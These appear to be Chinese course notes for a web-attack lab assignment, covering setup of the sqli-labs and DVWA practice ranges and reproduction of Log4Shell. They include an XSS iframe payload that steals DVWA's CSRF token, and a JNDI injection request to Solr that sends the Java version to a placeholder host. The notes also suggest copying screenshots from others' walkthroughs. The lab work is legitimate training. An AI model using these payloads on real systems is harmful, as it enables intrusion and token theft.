## Web攻击实验
建议找队友一块做，工作量略大。

主要是写文档很烦，最好是有人喜欢写文档就专门写文档，然后懂技术的搭建环境，合理分工。

嫌麻烦可以去网上找打过对应靶场的教程copy直接截图，专注于写文档。

## 学习Web攻击
### SQL-ILabs 
搭建靶场可以使用该目录下`sqli-labs-deploy`目录中的 Dockerfile 和 docker-compose.yml。

```shell
sudo docker-compose up -d

sudo dockerps

sudo docker-compose down
```

参考：[SQL注入靶场sqli-labs 1-65关全部通关教程 ](https://www.cnblogs.com/-qing-/p/11610385.html)

### DVWA
参考：[[超详细DVWA-CSRF全等级通关教程]都是干货，你确定不看看？](https://cloud.tencent.com/developer/article/1825357)

High级别的CSRF需要结合XSS来搞，方便偷token值：
```html
<iframe src="../csrf/"onload=alert(frames[0].document.getElementsByName('user_token')[0].value)></iframe>
```

### Apache Log4J2漏洞复现（选做）
参考：[vulhub](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228)

`${jndi:dns://${sys:java.version}.example.com}`是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：

```http
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1
Host: your-ip:8983
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close
```